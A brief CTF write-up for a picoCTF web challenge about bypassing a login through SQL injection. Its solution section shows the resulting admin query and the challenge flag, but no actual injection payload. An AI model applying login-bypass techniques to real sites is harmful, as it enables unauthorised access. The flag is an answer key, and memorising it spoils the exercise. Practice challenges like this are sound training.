## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849
## Solución
```
SELECT * FROM users WHERE name='admin';
# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}
```
## Notas adicionales

## Referencias
